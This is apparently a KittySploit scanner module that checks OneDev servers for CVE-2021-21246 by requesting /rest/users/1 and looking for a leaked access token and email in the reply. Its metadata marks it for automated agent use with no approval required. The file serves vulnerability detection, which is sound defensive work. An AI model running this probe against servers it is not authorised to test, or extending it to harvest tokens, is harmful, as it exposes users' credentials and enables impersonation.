#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""OneDev before version 4."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'OneDev < 4.0.3 - User Access Token Leak Detection',
        'description': 'OneDev before version 4.0.3 contains an insecure endpoint that allows retrieval of arbitrary user details, including access tokens, due to missing security checks on /users/{id}, letting attackers leak sensitive data and impersonate users, exploit requires no special conditions.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2021', 'onedev', 'auth-bypass', 'token-leak'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://github.com/theonedev/onedev/security/advisories/GHSA-66v7-gg85-f4gx',
            'https://github.com/theonedev/onedev/commit/a4491e5f79dc6cc96eac20972eedc8905ddf6089',
            'https://nvd.nist.gov/vuln/detail/CVE-2021-21246',
            'https://securitylab.github.com/advisories/GHSL-2020-214_223-onedev/',
        ],
        'cve': 'CVE-2021-21246',
    }

    def run(self):
        path = '/rest/users/1'
        r = self.http_request(method='GET', path=path, allow_redirects=False, headers={'Content-Type': 'application/json'})
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        content_type = r.headers.get("Content-Type") or r.headers.get("content-type") or ""
        body_all = ('"accessToken"', '"email"',)
        ctype_any = ('application/json',)
        if (all(m in body for m in body_all)) and (any(m in content_type for m in ctype_any)):
            self.set_info(
                severity='high',
                reason='OneDev < 4.0.3 - User Access Token Leak detected',
                path=path,
            )
            return True
        return False

